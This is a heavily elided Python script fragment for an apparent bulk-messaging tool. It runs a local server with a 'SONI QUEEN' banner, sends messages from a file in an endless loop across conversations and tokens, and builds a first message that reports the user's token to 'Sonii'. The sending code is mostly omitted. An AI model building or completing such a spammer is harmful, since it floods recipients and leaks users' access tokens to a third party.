...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- SERVER RUNNING>>SONI")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello Sonii ! I am using your server. My token is {}"
      ...
      def liness():
          print('\033[1;92m' + '•─────────────────────SONI QUEEN HERE ───────────────────────────────•')
...
def send_messages_from_file():
      ...
      with open('Emoji TYPE.txt', 'r') as file:
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;35;40m[+] Sent Message {} of Convo {} Token {}: {}".format(
